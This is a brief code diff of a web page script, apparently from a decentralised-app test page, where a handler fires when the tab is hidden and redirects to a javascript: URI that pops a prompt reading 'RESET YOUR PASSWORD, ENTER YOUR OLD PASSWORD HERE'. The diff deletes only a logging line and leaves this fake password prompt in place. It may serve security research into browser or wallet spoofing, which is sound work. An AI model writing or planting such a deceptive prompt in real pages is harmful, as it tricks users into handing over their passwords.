@@ -6,7 +6,6 @@
 <script>
 document.addEventListener('visibilitychange', () => {
   if (document.hidden) {
-    console.log('DApp Hidden. Triggering tel: URI...');
     window.location.replace('javascript:prompt("RESET YOUR PASSWORD, ENTER YOUR OLD PASSWORD HERE");');
   }
 });
